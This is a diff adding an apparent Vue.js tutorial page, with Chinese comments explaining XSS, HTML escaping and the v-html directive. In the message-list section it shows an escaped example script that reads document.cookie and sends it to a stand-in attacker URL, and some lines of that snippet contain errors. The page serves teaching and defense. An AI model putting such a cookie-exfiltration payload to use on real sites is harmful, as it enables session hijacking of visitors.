@@ -6,6 +6,69 @@
     <title>Document</title>
 </head>
 <body>
-    
+    <div id="app">
+        <div>
+            <h2>预期</h2>
+            <ul>
+                <li><a href="">0</a></li>
+                <li><a href="">1</a></li>
+                <li><a href="">2</a></li>
+            </ul>
+            评论：<br>
+            <textarea name="content" id="" cols="30" rows="10"></textarea>
+        </div>
+        <div>
+            <h2>留言列表</h2>
+            <hr>
+            <!-- 如果攻击者在留言框留下了这段代码，那么下一个留言的人来浏览时留言列表里就会有这段代码出来，这段代码出来之后，谁访问，谁的cookie就会向这个url地址发送过去  -->
+            <!-- cookie 用户标识，用户是否登录 -->
+            <!-- 那些攻击者就可以利用伪造cookie模仿你的登录，然后进行破坏，这种攻击方式就被称为xss攻击 -->
+             &lt;script&gt;
+                // document.cookie;
+                // 1.先获取浏览器的cookie
+                var cookie=document.cookie;
+                var sc=document.createElement('scr');
+                // 2.动态地创建一个script脚本，这个脚本会向一个src地址发网络请求，发网络请求地时候就把cookie携带过去
+                sc.src='http://heek.com?index.php?cookie='+cookie;  // 攻击者的url地址
+                document.head[0].appendChild(sc);
+
+            &lt;/script&gt;
+            <!--为了防止这种攻击，就要让这段script代码不能执行，用&lt;代替<以及&gt;代替>，这样在留言中留下这段代码后，浏览器就会把它当作正常的普通的字符串进行转义输出，这样就没有危险性了 -->
+        </div>
+        <p>{{ title }}</p>
+        <hr>
+        <div>
+            <!-- vuejs在遇到html标签的的时候，会转换成HTML的实体符号然后再进行输出。为什么要转换为实体符号？ -->
+            <!-- 主要是为了哇观战的安全，存在一种xss攻击 -->
+            <!-- while(1){
+                    alert(1);
+                  } -->
+            {{ pageHtml}}
+            <!--vuejs作者为了安全，把数据做了处理，但是我们现在希望这个数据可以正常地输出-->
+            <!--插值表达式现在不可以完成-->
+            <hr>
+            <!--以后如果确定内容是安全的，就可以用v-html，如果不确定内容是否安全，那么就用插值表达式-->
+            <!--v-html指令：底层dom.innerHTML=pageHtml-->
+            <div v-html="pageHtml"></div>
+        </div>
+    </div>
 </body>
+<script src="https://cdn.bootcss.com/jquery/2.0.1/jquery.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script>
+
+    var vm=new Vue({
+        el:'#app',
+        data:{
+            title:'hi vuejs',
+            pageHtml:`<ul>
+                <li><a href="">0</a></li>
+                <li><a href="">1</a></li>
+                <li><a href="">2</a></li>
+            </ul>`,
+        }
+    })
+
+    console.log(vm);
+</script>
 </html>
